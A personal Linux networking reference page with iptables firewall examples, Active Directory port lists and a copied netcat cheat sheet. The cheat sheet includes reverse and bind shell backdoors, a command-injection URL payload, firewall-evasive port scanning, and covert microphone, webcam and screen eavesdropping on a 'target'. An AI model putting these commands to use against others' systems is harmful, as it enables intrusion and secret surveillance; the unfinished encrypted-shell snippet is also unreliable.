---
type: reference
title: Useful tools
description: "Useful network tools: netstat and iptables examples for blocking IPs and allowing DNS access."
tags: [firewall, linux, cheatsheet, networking, legacy]
generated: { by: "human:izaqyos", at: "2026-10-14T00:00:00Z" }
stale_after: "2028-10-14T00:00:00Z"
sources:
  - { id: rfc-8996, resource: "https://www.rfc-editor.org/rfc/rfc8996", title: "RFC 8996: Deprecating TLS 1.0 and TLS 1.1" }
  - { id: curl-tlsv12, resource: "https://curl.se/docs/manpage.html", title: "curl man page (--tlsv1.2, --tlsv1.3, --tls-max, --sslv3)" }
  - { id: ip-8, resource: "https://man7.org/linux/man-pages/man8/ip.8.html", title: "ip(8) - Linux manual page" }
status: stable
capture_type: source
legacy_source: "Network/NetworkKB#9"
---

# Useful tools

[↑ NetworkKB](/Network/kb-network/README.md)

## 9.1 netstat

## 9.2 iptables

### 9.2.1 My examples

#### 9.2.1.1 Block IP

```text
block source: iptables -A INPUT -s <IP address> -j DROP
block dest: iptables -A OUTPUT -d <IP address> -j DROP

- Unblock
iptables -L INPUT -n --line-numbers
iptables -D INPUT N
where N is line # blocking the IP 
```

#### 9.2.1.2 Allow access to DNS nameserver

```text
Linux Iptables block or open DNS / bind service port 53
by NIX CRAFT on JULY 13, 2005 · 4 COMMENTS· LAST UPDATED OCTOBER 12, 2007
in BIND DNS, DEBIAN LINUX, GENTOO LINUX

The domain name service provided by BIND (named) software. It uses both UDP and TCP protocol and listen on port 53. DNS queries less than 512 bytes are transferred using UDP protocol and large queries are handled by TCP protocol such as zone transfer.

i) named/bind server – TCP/UDP port 53

ii)Client (browser, dig etc) – port > 1023

Allow outgoing DNS client request:

Following iptables rules can be added to your shell script.

SERVER_IP is your server ip address

DNS_SERVER stores the nameserver (DNS) IP address provided by ISP or your own name servers.

Following rules are useful when you run single web/smtp server or even DSL/LL/dialup Internet connections:

SERVER_IP="202.54.10.20"
DNS_SERVER="202.54.1.5 202.54.1.6"
for ip in $DNS_SERVER
do
iptables -A OUTPUT -p udp -s $SERVER_IP --sport 1024:65535 -d $ip --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -p udp -s $ip --sport 53 -d $SERVER_IP --dport 1024:65535 -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT-p tcp -s $SERVER_IP --sport 1024:65535 -d $ip --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -p tcp -s $ip --sport 53 -d $SERVER_IP --dport 1024:65535 -m state --state ESTABLISHED -j ACCEPT
done
(B) Allow incoming DNS request at port 53:

Use following rules only if you are protecting dedicated DNS server.

SERVER_IP is IP address where BIND(named) is listing on port 53 for incoming DNS queries.

Please note that here I'm not allowing TCP protocol as I don't have secondary DNS server to do zone transfer.

SERVER_IP="202.54.10.20"
iptables -A INPUT -p udp -s 0/0 --sport 1024:65535 -d $SERVER_IP --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p udp -s $SERVER_IP --sport 53 -d 0/0 --dport 1024:65535 -m state --state ESTABLISHED -j ACCEPT
iptables -A INPUT -p udp -s 0/0 --sport 53 -d $SERVER_IP --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p udp -s $SERVER_IP --sport 53 -d 0/0 --dport 53 -m state --state ESTABLISHED -j ACCEPT
Please note if you have secondary server, add following rules to above rules so that secondary server can do zone transfer from primary DNS server:

DNS2_IP="202.54.10.2"
iptables -A INPUT -p tcp -s $DNS2_IP --sport 1024:65535 -d $SERVER_IP --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p tcp -s $SERVER_IP --sport 53 -d $DNS2_IP --dport 1024:65535 -m state --state ESTABLISHED -j ACCEPT
```

#### 9.2.1.3 Block access to DNS nameserver

```text
# export SERVER_IP="<internal-ip>"
# export DNS_SERVER="<internal-ip>"
# iptables -A OUTPUT -p udp -s $SERVER_IP --sport 1024:65535 -d $DNS_SERVER  --dport 53 -m state --state NEW,ESTABLISHED -j DROP
# iptables -A INPUT -p udp -s $DNS_SERVER --sport 53 -d $SERVER_IP --dport 1024:65535 -m state --state ESTABLISHED -j DROP
Try `iptables -h' or 'iptables --help' for more information.
# iptables -A OUTPUT -p tcp -s $SERVER_IP --sport 1024:65535 -d $DNS_SERVER --dport 53 -m state --state NEW,ESTABLISHED -j DROP
# iptables -A INPUT -p tcp -s  $DNS_SERVER --sport 53 -d $SERVER_IP --dport 1024:65535 -m state --state ESTABLISHED -j DROP
# nslookup horse2
;; connection timed out; trying next origin
;; connection timed out; no servers could be reached
```

#### 9.2.1.4 UnBlock access to DNS nameserver

```text
cont. prev ex:
# iptables -L OUTPUT -n
Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
DROP       icmp --  0.0.0.0/0            0.0.0.0/0           icmp type 14 
ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0           
ACCEPT     icmp --  0.0.0.0/0            0.0.0.0/0           
DROP       all  --  <internal-ip>          0.0.0.0/0           
DROP       udp  --  <internal-ip>          <internal-ip>         udp spts:1024:65535 dpt:53 state NEW,ESTABLISHED 
DROP       tcp  --  <internal-ip>          <internal-ip>         tcp spts:1024:65535 dpt:53 state NEW,ESTABLISHED 
# iptables -L OUTPUT -n --line-numbers
Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    DROP       icmp --  0.0.0.0/0            0.0.0.0/0           icmp type 14 
2    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0           
3    ACCEPT     icmp --  0.0.0.0/0            0.0.0.0/0           
4    DROP       all  --  <internal-ip>          0.0.0.0/0           
5    DROP       udp  --  <internal-ip>          <internal-ip>         udp spts:1024:65535 dpt:53 state NEW,ESTABLISHED 
6    DROP       tcp  --  <internal-ip>          <internal-ip>         tcp spts:1024:65535 dpt:53 state NEW,ESTABLISHED 
#   -n --line-numbers
-bash: -n: command not found
# iptables -D OUTPUT 5
# iptables -D OUTPUT 5
# iptables -L OUTPUT -n --line-numbers
Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    DROP       icmp --  0.0.0.0/0            0.0.0.0/0           icmp type 14 
2    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0           
3    ACCEPT     icmp --  0.0.0.0/0            0.0.0.0/0           
4    DROP       all  --  <internal-ip>          0.0.0.0/0   

# iptables -L INPUT -n --line-numbers
Chain INPUT (policy DROP)
num  target     prot opt source               destination         
1    RATELIMIT  all  --  0.0.0.0/0            0.0.0.0/0           
2    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0           state RELATED,ESTABLISHED 
3    DROP       all  --  <internal-ip>          0.0.0.0/0           
4    DROP       udp  --  <internal-ip>          <internal-ip>         udp spt:53 dpts:1024:65535 state ESTABLISHED 
5    DROP       tcp  --  <internal-ip>          <internal-ip>         tcp spt:53 dpts:1024:65535 state ESTABLISHED 
# iptables -D INPUT 4
# iptables -D INPUT 4
# iptables -L INPUT -n --line-numbers
Chain INPUT (policy DROP)
num  target     prot opt source               destination         
1    RATELIMIT  all  --  0.0.0.0/0            0.0.0.0/0           
2    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0           state RELATED,ESTABLISHED 
3    DROP       all  --  <internal-ip>          0.0.0.0/0       
```

#### 9.2.1.5 Required ports to communicate with Active-Directory Domain controller

```text
UDP Port 88 for Kerberos authentication

UDP and TCP Port 135 for domain controllers-to-domain controller and client to domain controller operations.

TCP Port 139 and UDP 138 for File Replication Service between domain controllers.

UDP Port 389 for LDAP to handle normal queries from client computers to the domain controllers.

TCP and UDP Port 445 for File Replication Service

TCP and UDP Port 464 for Kerberos Password Change

TCP Port 3268 and 3269 for Global Catalog from client to domain controller.

TCP and UDP Port 53 for DNS from client to domain controller and domain controller to domain controller.

also, take a look at the below article.. http://support.microsoft.com/kb/832017#4 

RPC (445) TCP
LDAP (389) TCP
LDAP (389) UDP
KDC (88) TCP
UDP/TCP (3268) - GC
KPASS (464) TCP
NTP? (123) UDP
 DCERPC - ports 135,445 is down

			9.2.1.6
```

### 9.2.2 25 most used iptables examples

```text
# Modify this file accordingly for your specific requirement.
# http://www.thegeekstuff.com
# 1. Delete all existing rules
iptables -F

# 2. Set default chain policies
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP

# 3. Block a specific ip-address
#BLOCK_THIS_IP="x.x.x.x"
#iptables -A INPUT -s "$BLOCK_THIS_IP" -j DROP

# 4. Allow ALL incoming SSH
#iptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
#iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

# 5. Allow incoming SSH only from a sepcific network
#iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
#iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

# 6. Allow incoming HTTP
#iptables -A INPUT -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT
#iptables -A OUTPUT -o eth0 -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT

# Allow incoming HTTPS
#iptables -A INPUT -i eth0 -p tcp --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT
#iptables -A OUTPUT -o eth0 -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT

# 7. MultiPorts (Allow incoming SSH, HTTP, and HTTPS)
iptables -A INPUT -i eth0 -p tcp -m multiport --dports 22,80,443 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp -m multiport --sports 22,80,443 -m state --state ESTABLISHED -j ACCEPT

# 8. Allow outgoing SSH
iptables -A OUTPUT -o eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

# 9. Allow outgoing SSH only to a specific network
#iptables -A OUTPUT -o eth0 -p tcp -d 192.168.101.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
#iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

# 10. Allow outgoing HTTPS
iptables -A OUTPUT -o eth0 -p tcp --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i eth0 -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT

# 11. Load balance incoming HTTPS traffic
#iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 0 -j DNAT --to-destination 192.168.1.101:443
#iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 1 -j DNAT --to-destination 192.168.1.102:443
#iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 2 -j DNAT --to-destination 192.168.1.103:443

# 12. Ping from inside to outside
iptables -A OUTPUT -p icmp --icmp-type echo-request -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT

# 13. Ping from outside to inside
iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT
iptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT

# 14. Allow loopback access
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# 15. Allow packets from internal network to reach external network.
# if eth1 is connected to external network (internet)
# if eth0 is connected to internal network (192.168.1.x)
iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT

# 16. Allow outbound DNS
#iptables -A OUTPUT -p udp -o eth0 --dport 53 -j ACCEPT
#iptables -A INPUT -p udp -i eth0 --sport 53 -j ACCEPT

# 17. Allow NIS Connections
# rpcinfo -p | grep ypbind ; This port is 853 and 850
#iptables -A INPUT -p tcp --dport 111 -j ACCEPT
#iptables -A INPUT -p udp --dport 111 -j ACCEPT
#iptables -A INPUT -p tcp --dport 853 -j ACCEPT
#iptables -A INPUT -p udp --dport 853 -j ACCEPT
#iptables -A INPUT -p tcp --dport 850 -j ACCEPT
#iptables -A INPUT -p udp --dport 850 -j ACCEPT

# 18. Allow rsync from a specific network
iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT

# 19. Allow MySQL connection only from a specific network
iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 3306 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 3306 -m state --state ESTABLISHED -j ACCEPT

# 20. Allow Sendmail or Postfix
iptables -A INPUT -i eth0 -p tcp --dport 25 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 25 -m state --state ESTABLISHED -j ACCEPT

# 21. Allow IMAP and IMAPS
iptables -A INPUT -i eth0 -p tcp --dport 143 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 143 -m state --state ESTABLISHED -j ACCEPT

iptables -A INPUT -i eth0 -p tcp --dport 993 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 993 -m state --state ESTABLISHED -j ACCEPT

# 22. Allow POP3 and POP3S
iptables -A INPUT -i eth0 -p tcp --dport 110 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 110 -m state --state ESTABLISHED -j ACCEPT

iptables -A INPUT -i eth0 -p tcp --dport 995 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 995 -m state --state ESTABLISHED -j ACCEPT

# 23. Prevent DoS attack
iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT

# 24. Port forwarding 422 to 22
iptables -t nat -A PREROUTING -p tcp -d 192.168.102.37 --dport 422 -j DNAT --to 192.168.102.37:22
iptables -A INPUT -i eth0 -p tcp --dport 422 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 422 -m state --state ESTABLISHED -j ACCEPT

# 25. Log dropped packets
iptables -N LOGGING
iptables -A INPUT -j LOGGING
iptables -A LOGGING -m limit --limit 2/min -j LOG --log-prefix "IPTables Packet Dropped: " --log-level 7
iptables -A LOGGING -j DROP
```

## 9.3 telnet

## 9.4 netcat, nc

### 9.4.1 Netcat cheat sheet

> Updated 2026-10 to current practice.[^ip-8] The `ifconfig` hint and the curl SSL/TLS protocol tests were rewritten (see the markdown blocks inside this section).[^rfc-8996]

````text
    Netcat, also known as the Swiss-army knife for TCP/IP is capable of so many wonderful tasks, many people only know a partial amount of the features so I made a special cheat sheet for all the basic and more advanced features it supports.

Backdooring

    Basic netcat backdoor shells
    Better netcat backdoor shells

Contents 	Introduction
listening/connecting

    Make netcat listen for a connection
    Make netcat connect

Using files during connections
Port scanning

    Portscan a target with netcat
    Portscan a network range with netcat

Banner grabbing
Introduction

The basics of Netcat can be found in the man page which is good for beginners, you can find the man page for your version of netcat by typing this in the terminal:

$ man nc

If you don't like reading man pages through the terminal you can install the package "man2html" which makes it possible to read the manuals through the browser or just Google the man page with the query "man <program>" ("man nc" in our case).
Make netcat listen for a connection

Command

nc -l <port>

Result
Netcat will start to listen on the defined <port>, as soon as something makes a full 3-way TCP handshake to the port there is the possibility of transferring data, the connection can be closed at any time from both sides; once the connection is closed the netcat process is also stopped and the port will be closed again.

Example

nc -l 1337

Notes
1. You may need the -p parameter to define the port; in most versions this is not required (nc -l -p 1337).
2. If you want to force netcat to stay listening after one connection you can use the -k flag. (nc -l -k 1337)
3. Using the -v (verbose) flag will make netcat output who is connecting (over stderr), this is good to know when using the -k flag because it is possible that there are different computers connecting to you.
4. Flags can be parsed in a chain like this: "nc -lkv 1337".
Make netcat connect

Command

nc <computer> <port>

Result
Netcat will establish a 3-way TCP handshake to the defined computer/port, when succeeded you can talk with the computer/port with the keyboard (stdin).

Example

nc h.ackack.net 80

Notes
1. Adding the "-v" (verbose) flag is a nice check to see if a website is up. Here is an example:

$ nc -v www.ackack.net 80
Connection to www.ackack.net 80 port [tcp/www] succeeded!

Using files during connections

It is possible to save the data which is send to you or you can give netcat a file which should be sended when a connection is made.
Here is an example on how to save the data which is being send by the server:

$ nc h.ackack.net 80 > response
# you can now send data but you won't see the output from the server because it is being redirected to a file.
$ nc ackack.net 80 > response
HEAD / HTTP/0.1

$ cat response
HTTP/1.1 200 OK
Date: <timestamp>
Server: Apache
Last-Modified: <timestamp>
Accept-Ranges: bytes
Content-Length: 3383
Connection: close
Content-Type: text/html

It is also possible to give netcat a file which should be pushed over the connection as soon as netcat connects, here is an example where we make the local computer listen over port 1337 and netcat will connect to it and push a file through the connection.

# First we need a file so let's create one already.
$ echo "Hello world" > file
# In another terminal we make netcat listen on port 1337 and wait for the file.
$ nc -l 1337
# Now we are going to connect to the port and push the file through the connection.
$ nc localhost 1337 < file
# Look on in the terminal where you just made netcat listen, here is the output:
$ nc -l 1337
Hello world
# You may have noticed that the connection was terminated, this is normal when you push a file through the connection netcat will terminate it when the eof is reached.

Alright, now let's try to do some cool things with this.
We can transfer files this way by making netcat listen on the first side of the connection and capture it on the other side.

# First make it listen and tell it to capture the output to a file.
$ nc -l 1337 > backup.tar.gz
# Now connect to it and push a file in it
$ nc localhost 1337 < backup.tar.gz
# Now you got a file which is called "backup.tar.gz" and contains the same content on both sides.

Or reversed...

# Now make the server listen and anything that connects to it will get the file backup.tar.gz
$ nc -l 1337 < backup.tar.gz
# On the other side connect and save the contents
$ nc localhost 1337 > backup.tar.gz
# Same result: a copy of backup.tar.gz is made.

You can also monitor files this way:

# Make netcat listen, this time we do it with a pipe symbol, this is just another way to get the job done.
$ tail -f /var/log/apache2/access.log | nc -l 1337
# Connect to it
$ nc localhost 1337
<ip> - - [<timestamp>] <user agent>
<ip> - - [<timestamp>] <user agent>
<ip> - - [<timestamp>] <user agent>
<streaming output of /var/log/apache2/access.log>
# The connection will stay open and if there are any new requests you will immediately receive them.

Here is another very cool example, here we are going live eavesdrop the microphone of the target:

# We are going to use arecord for this and all output will be written to whatever is connected to port 1337.
arecord -f dat -t raw | nc -l 1337
# Now we have to connect to this port with netcat and we want to convert all data which is being send to .ogg format so we can hear it.
nc localhost 1337 | oggenc - -r -o nc.ogg
# Now just open nc.ogg with ogg123/vlc or something you like and you will have a live stream with your target's microphone. It will also save all the data to nc.ogg which is good for when you later want to analyze what people said.

The same method can be used for eavesdropping the screen/webcam/anything you like, just find a nice package which can do the job for you.

For desktop and sound eavesdropping the package "recordmydesktop" is good when it's installed.
Getting a good streaming connection with screen and sound is pretty hard so what I did to get it to work is just make a dumpfile like this:
recordmydesktop --on-the-fly-encoding --overwrite -o /tmp/nc.ogv
And later transfer the entire contents to me the way we earlier transferred files.
nc -l 1337 < /tmp/nc.ogv
Then you can just view the video and recorded sound.
Be sure you don't let the entire hard disk overflow with this because it will stay recording, a simple command can kill the recordmydesktop process again.
$ killall recordmydesktop
Or just find the pid with the program ps and kill the pid.

Eavesdropping the webcam with nc is very detectable due to the blinking light/steady green light on the webcam these days, what you can do is just making pictures which will only make it blink very fast, I you can use various packets for it but I will demonstrate it here with streamer.

# First you make a photo and save it in /tmp/image.jpeg, then you set netcat to listen and let it present the photo once somebody connects to it.
$ while [ 1 ]; do streamer -o /tmp/photo.jpeg; nc -l 1337 < /tmp/photo.jpeg; done
# On the other side you connect to it and save the current image.
$ nc localhost 1337 > image.jpeg
# Now the picture will get updated and when reconnecting you will get a new picture real time.

The same idea can be implemented for screenshots.

# listen
$ while true; do import -window root /tmp/image.png; nc -l 1337 < /tmp/image.png; done
# and connect
$ nc localhost 1337 > image.png
# Screenshot is updated and you can grab a new screenshot.

Portscan a target with netcat

Command

nc -zv <target> <port/port range> 2>&1 | grep succeeded

Result
Netcat will start trying to make full 3-way TCP handshakes over the port/port range.
-> SYN
-> ACK
nmap does it a little bit different and injects a RST packet instead of an ACK, this causes the connection to not fully get established and is way more stealthy.
-> SYN
-> RST
"2>&1" is because we want to redirect stderr (standard error) and stdout (standard output) both to a file, I will be using this a lot in the following port scan examples so remember this.

Example

nc -zv 10.13.37.1 1-3400 2>&1 | grep succeeded

Notes
1. When using something like a PHP RCE exploit and you don't have a streaming connection through a shell it is useful to pipe the output to a file. Here is an example of how to do so:

nc -zv 10.13.37.1 1-3400 2>&1 | grep succeeded > /tmp/10.13.37.1.txt
#Inject it where you got a remote code execution exploit, here is an example:
#http://att.ackack.net/imageviewer.php?ls=/var/www/images/'; nc -zv 10.13.37.1 1-3400 2>&1 | grep succeeded > /tmp/10.13.37.1.txt; echo '
#This will happen server side in this example: $ ls '/var/www/images/'; nc -zv 10.13.37.1 1-3400 2>&1 | grep succeeded > /tmp/10.13.37.1.txt; echo '';

Portscan a network range with netcat

method 1, subnet scanning

# We will be scanning the subnet 10.13.37.1/24 for port 80, results can be found back in /tmp/pscan and it is all multi tasked so this shouldn't take longer than a second or 2.
$ range="10.13.37."; port=80; for host in $(seq 1 255); do multi_task=$(result=$(nc -zv $range$host $port 2>&1 | grep succeeded); if [ -n "$result" ]; then echo $range$host":"$port >> "/tmp/pscan"; fi;) & done

method 2, list based scanning

# You will need a file filled with hosts for this, I used /tmp/hosts which contained:
# 10.13.37.1
# 10.13.37.23
# google.com
# 10.13.37.173
# ackack.net
$ port=80; for host in $(cat /tmp/hosts); do multi_task=$(result=$(nc -zv $host $port 2>&1 | grep succeeded); if [ -n "$result" ]; then echo $host":"$port >> "/tmp/pscan"; fi;) & done
# It's all multi tasked again and the structure is pretty similar to the method 1.

method 3, network subnet scanning all ports on all hosts
Extremely noisy to firewalls and might eat a lot of CPU but it works, you can also save it to a file and issue it with the command "nice -n 20" this makes it a little nicer for your CPU.

$ range="10.13.37."; for host in $(seq 1 255); do multi_task=$(result=$(nc -zv $range$host 1-65535 2>&1 | grep succeeded); if [ -n "$result" ]; then echo $result >> "/tmp/pscan"; fi;) & done

method 4 list based scanning with delay

Some delay between the ports is good for letting the firewalls think there is nothing special going on.
This will scan all the hosts in /tmp/hosts on ports 20-100 with 1 second delay between the ports and save the results to /tmp/pscan.

#!/bin/sh
range="10.13.37."
ports=$(seq 20 100)
for host in $(cat /tmp/hosts); do
	for port in $ports; do
		result=$(nc -zv $range$host $port 2>&1 | grep succeeded);
		if [ -n "$result" ]; then
			echo $range$host":"$port >> "/tmp/pscan";
		fi;
		sleep 1;
	done
done

Notes
1. If you don't want multi tasked scanning which can be pretty extensive and noisy replace the "& done" for "; done".
2. Adding the -r flag will make the source and or destination port ranges random instead of letting the system assign which ports to use.
Banner grabbing

Port scanning is fun but we can't do a lot with this until we properly fingerprinted the programs behind the ports, this can be done with a technique called banner grabbing.
Now that the scripts are getting bigger and bigger I won't be displaying one liners anymore, you will have to write the files to filenames and execute them.
Here is a script which will port scan and banner grab automatically with netcat.
It will check for the SSH and MySQL version by connecting and saving the results and it will see if the HTTP server is vulnerable to the TRACE method, look in the dumpfile /tmp/bannergrab and look for "<script>alert(123)</script>" if you can find that back you got yourself a vulnerable server.

#!/bin/sh
range="192.168.1.";
# You can change this to a port range $(seq 20 25) is port 20-25
ports="22 80 3306";

http_header="HEAD / HTTP/0.1\n\n";

for host in $(seq 137 139); do
	for port in $ports; do
		echo "[+] Testing "$range$host":"$port;
		result=$(nc -zv $range$host $port 2>&1 | grep succeeded);
		if [ -n "$result" ]; then
			echo "\n"$range$host":"$port"\n" >> "/tmp/bannergrab"
			if [ "$port" -eq "22" ]; then
				echo "Found open port "$range$host":"$port" Here might be some SSH server, it echoes the SSH version to you on connecting when lucky.";
				nc -v $range$host $port -w 1 >> "/tmp/bannergrab";
			fi;
			if [ "$port" -eq "80" ]; then
				echo "Found open port "$range$host":"$port" Trying to fingerprint with HEAD and see if the server is vulnerable to TRACE XSSing";
				echo $http_header | nc -v -w 2 $range$host $port >> "/tmp/bannergrab"
				echo "TRACE / HTTP/1.1\nHost: $range$host\nuser-agent: <script>alert(123)</script>\n\n" | nc -v -w 2 $range$host $port >> "/tmp/bannergrab"
			fi;
			if [ "$port" -eq "3306"]; then
				echo "Found open port "$range$host":"$port" Possible MySQL installation found, saving the banner for later inspection, the MySQL version can be found in this.";
				nc -v $range$host $port -w 1 >> "/tmp/bannergrab";
			fi;
		fi;
	done
done

Basic netcat backdoor shells

There is a flag "-e" in netcat, with this you can let netcat automatically listen with the specified program, it has been removed because of the security issues related to this, there has been a public exploit exploiting a buffer overflow in this since 2004 on windows and there has not been a patch.

# For *nix systems you can use this:
$ nc -l -e /bin/sh localhost 1337
# And for Windows systems you can use this:
$ nc -l -e cmd.exe cmd.exe 1337

Just another reminder, you might need the -p flag before the port, in the latest versions this is not required but the later versions also don't support the -e flag.
Once you executed this command on the computer you can simply netcat in it and you will have your shell.
You may wonder why a buffer overflow is a problem in a function which is mainly for creating a backdoor, it's because there are mail server scripts and things like that which depend on netcat.
You can also just give it another program for example this would open a port and echo anything back.

$ nc -l -e /bin/cat localhost 1337

Here you don't have supposedly a backdoor running but with the buffer overflow you could exploit it.
Anyway, let's reverse things, listening shells are way too detectable and when there is some basic port forwarding you can't get in already.
This way you will make yourself listen and netcat will connect to you and give you a shell.

# You do:
$ nc -lv 1337
# And on the machine you want to backdoor you do:
$ nc -e /bin/sh <Your IP> 1337

Be sure the remote computer can reach you over that port, when you have a home user setup you probably just have to go inside your router and port forward the port to your computer to make it work.
Better netcat backdoor shells

Since the -e flag has been removed in most versions we have to hack our way around it.
Here is a basic exmple of how to do so:

mkfifo /tmp/pipe;
sh /tmp/pipe | nc -l 1337 > /tmp/pipe

Just connect to it and you got a shell.
Here is the reversed version:

mkfifo /tmp/pipe
sh /tmp/pipe | nc localhost 1338 > /tmp/pipe

Unencrypted shell streams are very easy to sniff, we should encrypt them.

!under consruction! - blowfish encryption
#!/bin/sh
# This script is for the connecting client.

password="secret";

echo $1 > cache_cmd;
openssl enc -bf -pass pass:passwd -in cache_cmd | nc localhost 1337

#!/bin/sh
# This script is for the listening server.

password="secret";

openssl enc -bf -d -in $1 -pass pass:$password -out cache;
cat cache;

#tiny notes
openssl enc -bf -d -in pipe -pass pass:passwd | nc -l 1337 > pipe

openssl enc -bf -pass pass:passwd -in cache_cmd | nc localhost 1337
!under construction!

This cheat sheet is still under construction, I released it so friends can give feedback, if you have feedback or questions or you see errors please let me know through a comment or contact me if you know how (you can always look in the ackack IRC storm.psych0tik.net/6697 #ackack).

		9.4.2  netcat uses

I'm using two systems in this article:

    server1.example.com: IP address 192.168.0.100
    server2.example.com: IP address 192.168.0.101

netcat should already be installed on your system - you can check with

which nc

To learn more about netcat, take a look at its man page:

man nc

 
2 Copying A File From One System To The Other

Let's say we want to copy the file ISPConfig-2.2.27.tar.gz from server1 to server2. To do this, run

server2:

nc -lp 1234 > ISPConfig-2.2.27.tar.gz

on server2 (1234 is some unused port - you can replace it with another value if you like). server2 will then wait for the file ISPConfig-2.2.27.tar.gz on port 1234.

On server1, run

server1:

nc -w 1 server2.example.com 1234 < ISPConfig-2.2.27.tar.gz

to start the file transfer.

 
````

#### 3 Cloning Hard Drives & Partitions

You can use netcat to clone disks/partitions over the network. The target partitions must be unmounted, so to clone a system disk boot the target (server2) from a rescue/live image. Its IP address may change under the live system; check it with iproute2 (`ifconfig` is from the deprecated net-tools package and is often not installed):[^ip-8]

```bash
ip -br addr        # brief table: interface, state, addresses
ip addr show eth0  # full detail for one interface
```

In this example server2's live IP is 192.168.0.12. On server2 (receiver):

```bash
nc -l -p 1234 | dd of=/dev/sda bs=4M status=progress
```

Then on server1 (sender):

```bash
dd if=/dev/sda bs=4M status=progress | nc 192.168.0.12 1234
```

Note: `nc -l -p` is the traditional/GNU netcat syntax; OpenBSD netcat (default on Debian/Ubuntu/macOS) uses `nc -l 1234`. The transfer is unencrypted, so only do this on a trusted network (or pipe through `ssh` instead).

````text
4 Port Scanning

On server1, you can scan for open ports on server2 as follows:

server1:

nc -v -w 1 server2.example.com -z 1-1000

(1-1000 means: scan ports from port number 1 to port number 1000.)

You can also scan ports on the local system:

nc -v -w 1 localhost -z 1-1000

 
5 Serving Web Pages

You can even use netcat to act as a web server:

while true; do nc -l -p 80 -q 1 < somepage.html; done

would serve the page somepage.html until you close the terminal window.

 
6 Spoofing HTTP Headers

You can use netcat to request web pages:

nc ispconfig.org 80

You can then type in headers as follows:

GET / HTTP/1.1
Host: ispconfig.org
Referrer: mypage.com
User-Agent: my-browser

As you see, this allows you to make up your own referrers and browser (User-Agent). After you've typed in your headers, press ENTER twice, and the requested page will appear (including the headers sent back by the remote server):

server2:~# nc exampple.com 80
GET / HTTP/1.1
Host: example.com
Referrer: mypage.com
User-Agent: my-browser

HTTP/1.1 200 OK
Date: Fri, 28 Nov 2008 14:11:49 GMT
Server: Apache/2.2.3 (Debian) mod_ssl/2.2.3 OpenSSL/0.9.8c
Last-Modified: Wed, 26 Nov 2008 19:34:17 GMT
ETag: "228c707-21b1-b6b7e040"
Accept-Ranges: bytes
Content-Length: 8625
Content-Type: text/html

[...]

 
7 Chatting

You can even use netcat to chat from one system to the other on the command line.

Type

server2:

nc -lp 1234

on server2. server2 will then wait until server1 connects on port 1234.

On server1, run

server1:

nc server2.example.com 1234

Now you can type in messages on either system and press ENTER, and they will appear on the other system. To close the chat, press CTRL+C on either system.

 
		9.4.3 netcat check if port is open
# nc -z localhost 8000
Connection to localhost 8000 port [tcp/irdmi] succeeded!

double check w/ netstat
